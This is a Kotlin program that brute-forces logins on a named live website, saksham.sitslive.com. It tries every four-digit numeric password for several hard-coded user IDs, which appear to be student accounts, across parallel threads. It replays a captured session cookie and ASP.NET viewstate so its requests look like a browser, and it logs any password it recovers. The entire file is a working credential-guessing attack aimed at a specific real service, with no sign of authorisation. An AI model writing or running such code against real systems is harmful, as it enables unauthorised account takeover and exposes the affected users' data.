package com.ironclad

import org.apache.hc.client5.http.classic.methods.HttpPost
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient
import org.apache.hc.client5.http.impl.classic.HttpClients
import org.apache.hc.core5.http.io.entity.EntityUtils
import org.apache.hc.core5.http.io.entity.StringEntity
import org.slf4j.LoggerFactory
import kotlin.concurrent.thread
import kotlin.system.measureTimeMillis


fun main() {

    //This machine has a 6 cores hyper-threaded CPU
    //so don't run more than 12 bruteForceTask on this machine

    bruteforceTask("2023/2502")
    bruteforceTask("2023/2503")
    bruteforceTask("2023/2509")
    bruteforceTask("2023/2510")
}


const val url = "https://saksham.sitslive.com/login"

fun attemptLogin(username: String, password: String, client: CloseableHttpClient): String? {

    val post = HttpPost(url).apply {
        addHeader("accept", "*/*")
        addHeader("accept-language", "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7")
        addHeader("cache-control", "no-cache")
        addHeader("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
        addHeader("cookie", "ASP.NET_SessionId=w3xnaxbvl5d3j4gdz3xtlnf3")
        addHeader("origin", "https://saksham.sitslive.com")
        addHeader("referer", "https://saksham.sitslive.com/login")
        addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
        addHeader("sec-ch-ua", "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"")
        addHeader("sec-ch-ua-mobile", "?0")
        addHeader("sec-ch-ua-platform", "\"Windows\"")
        addHeader("sec-fetch-dest", "empty")
        addHeader("sec-fetch-mode", "cors")
        addHeader("sec-fetch-site", "same-origin")
        addHeader("x-microsoftajax", "Delta=true")
        addHeader("x-requested-with", "XMLHttpRequest")

        val payload = "ScriptManager1=updatepanel%7CbtnLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=GXq8WYlFoIyiG3kHh%2FyWm36EVSPnNg9oMUi9wBqeXZ5oLCwDaEF1fWGlZu6NIZKEGzs%2FZqM8kQDJ35ynh50OxuDTdeqaTh4wZe5gn2NIsPG1M9Ds%2BzDSx0hHu317Lrbw&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=k9EujBZLYjXQ6rTY4Kfb27V%2FFrBy8Ba23xg9ZaR9inInhEHhMnDnorNbGIO4S1IWOPs2u1aAPCkn5ieUxwSc0CgIlxhouE9FPckXsb%2F078IUjLS6AJvoaw3K%2F%2BAABCmEBzF1Ae469WWe4mDfDZPlJyLwg8Y3lH9jol6vnwidKeaSu%2FewI8Hnv04%2BBd2lhQqFFWErXV4tmCmIKvRSer%2FfDZ1HHrJ3Vk%2FQdhUnj8JX2LHHfAeU5ALRWJxbSolA%2FDYVhU8PM7E3jQd1FBYJtVrqHwAgbSxV%2B6dPvyEDYjFbaiHkiz84m5JxTVPK53KMH%2Bpa&txtLoginID=$username&txtPassword=$password&ddlType=0&txtUserName=&__ASYNCPOST=true&btnLogin=Login"
        entity = StringEntity(payload)
    }

    val response = client.execute(post)
    val responseText = EntityUtils.toString(response.entity)

    if (responseText.contains("pageRedirect")) {
        return password
    }
    else {
        return null
    }
}

fun bruteforce(username:String, start:Int=1000, end:Int=10000): String? {
    val client: CloseableHttpClient = HttpClients.createDefault()
    for (i in start..end) {
        val password = attemptLogin(username, i.toString(), client)
        if (password != null) {
            return password
        }
    }
    client.close()
    return null
}

//Beware that it creates a new thread and run bruteforce method on in it

fun bruteforceTask(username:String){
    val logger = LoggerFactory.getLogger("Main")

    thread {
        val threadExecutionTime = measureTimeMillis {
            logger.info("Bruteforce started for $username...")
            val password = bruteforce(username)
            if(password.isNullOrBlank()){
                logger.info("User does not exist")
            }
            else{
                logger.info("Password found of $username: $password")
            }
        }
        logger.info("Bruteforce finished in: $threadExecutionTime ms")
    }
}


